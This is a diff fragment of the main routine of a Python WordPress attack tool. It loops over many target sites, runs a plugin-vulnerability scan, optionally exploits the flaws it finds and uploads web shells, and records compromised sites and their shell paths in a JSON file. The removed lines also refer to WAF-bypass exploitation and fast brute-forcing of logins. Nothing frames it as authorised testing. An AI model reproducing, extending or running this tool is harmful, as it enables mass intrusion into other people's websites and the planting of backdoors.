+        print(f"  Targets: {len(targets)}")
+        print(f"  Shell: {args.shell or 'None'}")
+        print(f"{'═' * 70}{Style.RESET_ALL}\n")
         
-        vulnerable_count = 0
-        for target in targets:
-            print(f"\n{Fore.YELLOW}[>]{Style.RESET_ALL} Target: {target}")
+        vulnerable_targets = []
+        total = len(targets)
+        
+        for i, target in enumerate(targets, 1):
+            print(f"\n{Fore.YELLOW}[{i}/{total}]{Style.RESET_ALL} Scanning: {target}")
+            print(f"{Fore.CYAN}{'─' * 50}{Style.RESET_ALL}")
             
-            scanner = WordPressScanner(
-                target, 
-                shell_file=args.shell_file,
-                shell_content=args.shell_content
-            )
-            scanner.scan_all()
+            scanner = WordPressScanner(target, shell_file=args.shell)
+            scanner.scan()
             
-            if scanner.vulnerable:
-                vulnerable_count += 1
-                if args.exploit:
-                    for vuln in scanner.results["vulnerabilities"]:
-                        scanner.exploit_with_waf_bypass(vuln["plugin"])
-                scanner.generate_report()
-                scanner.save_vulnerable_target()
+            if scanner.has_vuln and args.exploit:
+                for vuln in scanner.results["vulnerabilities"]:
+                    scanner.exploit_plugin(vuln["plugin"])
+            
+            if scanner.has_vuln or scanner.results["shells"]:
+                vulnerable_targets.append({
+                    "target": target,
+                    "vulns": len(scanner.results["vulnerabilities"]),
+                    "shells": scanner.results["shells"]
+                })
+                scanner.save_report()
+                print(f"\n{Fore.RED}[!]{Style.RESET_ALL} VULNERABLE! {len(scanner.results['vulnerabilities'])} vulns")
+                if scanner.results["shells"]:
+                    for s in scanner.results["shells"]:
+                        print(f"  🐚 {s}")
             else:
-                print(f"{Fore.GREEN}[✓]{Style.RESET_ALL} Clean - no vulnerabilities")
+                print(f"\n{Fore.GREEN}[✓]{Style.RESET_ALL} CLEAN")
         
-        print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Done! Vulnerable: {vulnerable_count}/{len(targets)}")
+        # Summary
+        print(f"\n{Fore.CYAN}{'═' * 70}")
+        print(f"  📊 SCAN SUMMARY")
+        print(f"{'═' * 70}")
+        print(f"  Total: {total}")
+        print(f"  {Fore.RED}Vulnerable: {len(vulnerable_targets)}{Style.RESET_ALL}")
+        print(f"  {Fore.GREEN}Clean: {total - len(vulnerable_targets)}{Style.RESET_ALL}")
+        print(f"{'═' * 70}{Style.RESET_ALL}")
+        
+        # Save master list
+        master = []
+        if os.path.exists("vulnerable_targets.json"):
+            with open("vulnerable_targets.json", 'r') as f:
+                master = json.load(f)
+        
+        for vt in vulnerable_targets:
+            master = [t for t in master if t.get("target") != vt["target"]]
+            master.append({
+                "target": vt["target"],
+                "timestamp": datetime.now().isoformat(),
+                "vulns": vt["vulns"],
+                "has_shell": len(vt.get("shells", [])) > 0,
+                "shells": vt.get("shells", [])
+            })
+        
+        with open("vulnerable_targets.json", 'w') as f:
+            json.dump(master, f, indent=2)
+        
         return
     
-    if not args.target:
-        print(f"{Fore.RED}[!]{Style.RESET_ALL} Please provide target or use -f")
-        parser.print_help()
-        return
-    
-    scanner = WordPressScanner(
-        args.target,
-        shell_file=args.shell_file,
-        shell_content=args.shell_content
-    )
-    scanner.scan_all()
-    
-    if scanner.vulnerable:
-        if args.exploit:
-            for vuln in scanner.results["vulnerabilities"]:
-                scanner.exploit_with_waf_bypass(vuln["plugin"])
-        
-        if args.brute:
-            scanner.brute_force_login_fast()
-        
-        scanner.generate_report()
-        scanner.save_vulnerable_target()
-    else:
-        print(f"\n{Fore.GREEN}[✓]{Style.RESET_ALL} Target is CLEAN!")
+    print(f"{Fore.RED}[-]{Style.RESET_ALL} Please provide target or use -f")
+    parser.print_help()
 
 if __name__ == "__main__":
     main()
